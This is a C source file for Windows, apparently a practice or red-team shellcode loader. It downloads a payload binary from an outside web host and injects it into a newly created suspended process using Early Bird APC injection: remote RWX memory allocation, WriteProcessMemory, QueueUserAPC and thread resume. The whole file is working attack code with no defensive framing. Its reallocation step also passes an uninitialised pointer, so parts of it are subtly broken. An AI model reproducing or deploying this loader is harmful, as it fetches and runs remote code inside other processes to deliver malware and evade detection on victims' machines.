#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

#define C_PTR( x ) ( ( PVOID )     x ) // C_PTR (variable) cast to PVOID
#define U_PTR( x ) ( ( ULONG_PTR ) x ) // U_PTR (variable) cast to ULONG_PTR

BOOL HttpGetPayload(IN LPWSTR Host, IN USHORT Port, IN LPWSTR Path, OUT PVOID* Payload, OUT PSIZE_T Size) {
    BOOL      Success        = FALSE;
    ULONG     Read           = { 0 };
    ULONG     Length         = { 0 };
    HANDLE    Heap           = { 0 };
    HANDLE    Session        = { 0 };
    HANDLE    Connect        = { 0 };
    HANDLE    Request        = { 0 };
    BYTE      Buffer[ 1024 ] = { 0 };
    WCHAR     Method[]       = { L'G', L'E', L'T', NULL };
    ULONG_PTR Memory         = { 0 };

    RtlSecureZeroMemory(Buffer, sizeof(Buffer));

    //get heap memory
    Heap = GetProcessHeap();

    if (!Host || !Path || !Payload || !Size ) {
        return FALSE;
    }


    //open session with no proxy
    if (!(Session = WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0))) {
        printf("[-] WinHttpOpen Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if (!(Connect = WinHttpConnect(Session, Host, Port, 0))) {
        printf("[-] WinHttpConnect Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if (!(Request = WinHttpOpenRequest(Connect, Method, Path, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE ))) {
        printf("[-] WinHttpOpenRequest Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if (!WinHttpSendRequest(Request, NULL, 0, NULL, 0, 0, 0)) {
        printf("[-] WinHttpSendRequest Failed: %ld\n", GetLastError());
        goto LEAVE;
    }

    if (!WinHttpReceiveResponse(Request, NULL)) {
        printf("[-] WinHttpReceiveResponse Failed: %ld\n", GetLastError());
        goto LEAVE;
    }


    /* read the entire payload from the request response*/
    do {
        /* read from response and put it to Buffer and store number of bytes read to Read variable*/
        Success = WinHttpReadData(Request, Buffer, sizeof(Buffer), &Read);
        if (! Success || Read == 0 ) {
            break;
        }

        /* allocate heap memory or more */
        if (!Memory) {
            // allocate memory to the heap and initalize it with zeroes with the size of the number of bytes read
            Memory = HeapAlloc(Heap, HEAP_ZERO_MEMORY, Read);
        } else {
            // if heap memory is already allocated, reallocate
            Memory = HeapReAlloc(Heap, HEAP_ZERO_MEMORY, *Payload, Length + Read);
        }

        /* copy read buffer into our heap memory */
        memcpy(Memory + Length, Buffer, Read);
        RtlSecureZeroMemory(Buffer, sizeof(Buffer));

        /* increase total read payload length */
        Length += Read;
    } while (Success);

    *Size    = Length;
    *Payload = Memory;

    Success = TRUE;

LEAVE:
    if (Session) {
        WinHttpCloseHandle(Session);
    }

    if (Connect) {
        WinHttpCloseHandle(Connect);
    }

    if (Request) {
        WinHttpCloseHandle(Request);
    }
    return Success;
}

VOID EarlyBirdInject(LPSTR  Process, PVOID Payload, SIZE_T Size) {
    PROCESS_INFORMATION ProcessInfo = { 0 };
    STARTUPINFO         StartupInfo = { 0 };
    PVOID               MmPayload   = { 0 };

    ZeroMemory( &ProcessInfo, sizeof( ProcessInfo ) );
    ZeroMemory( &StartupInfo, sizeof( StartupInfo ) );

    //
    // create target process
    // in suspended state to inject into
    //
    if (!CreateProcessA( NULL, Process, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, &ProcessInfo)) {
        printf("[-] CreateProcessA Failed: %ld\n", GetLastError());
        goto END; 
    } else {
        printf("[*] Process created :: %s Pid:[%d]\n", Process, ProcessInfo.dwProcessId);
    }

    //
    // allocate virtual memory
    // in the remote process 
    //
    if (!(MmPayload = VirtualAllocEx(ProcessInfo.hProcess, NULL, Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
        printf("[-] VirtualAllocEx Failed: %ld\n", GetLastError());
        goto END;
    } else {
        printf("[*] Allocated memory @ 0x%llx\n", U_PTR( MmPayload ));
    }

    //
    // write payload into the remote process 
    //
    if (!WriteProcessMemory(ProcessInfo.hProcess, MmPayload, Payload, Size, NULL)) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        goto END;
    } else {
        puts("[*] Wrote payload into remote process");
    }

    //
    // queue apc call 
    // 
    if (!QueueUserAPC(C_PTR(MmPayload), ProcessInfo.hThread, 0)) {
        printf("[-] QueueUserAPC Failed: %lx\n", GetLastError());
        goto END;
    } else {
        puts("[*] Queued apc call into main process thread");
    }

    puts("[*] Resume process and trigger code...");
    ResumeThread(ProcessInfo.hThread);
    puts("[+] Execute shellcode");

END:
    return;
}

int main() {
    PVOID  MmPayload = { 0 };
    SIZE_T MmPaySize = { 0 };
    LPSTR  Process   = { 0 };

    //Process = "C:\\Windows\\System32\\PE-bear.exe";
    Process = "C:\\Users\\e1n\\Downloads\\PEBear\\PE-bear.exe";

    //
    // retrieve payload from remote server
    //
    if (!HttpGetPayload(L"e1ntestproject002.000webhostapp.com", 443, L"/payload.bin", &MmPayload, &MmPaySize)) {
        puts( "[-] Failed to retrieve payload" );
        goto END;
    } 

    printf("[*] payload @ 0x%llx [%llu]\n", U_PTR(MmPayload), MmPaySize);

    //
    // inject into a child process 
    //
    EarlyBirdInject(Process, MmPayload, MmPaySize);

END:
    return 0;
}
